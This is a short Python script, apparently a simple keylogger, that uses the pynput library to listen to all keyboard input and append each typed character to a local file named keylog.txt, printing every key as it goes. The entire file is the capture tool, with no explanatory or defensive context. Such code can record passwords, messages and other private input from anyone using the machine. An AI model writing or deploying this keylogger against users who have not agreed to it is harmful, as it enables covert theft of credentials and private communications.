from pynput import keyboard

def keyp(k):
    print(str(k))
    with open("keylog.txt",'a') as lgkey:
        try:
            char=k.char
            lgkey.write(char)
        except:
              print("Error getting char")

if __name__== "__main__":
     listener = keyboard.Listener(on_press = keyp)
     listener.start()
     input()
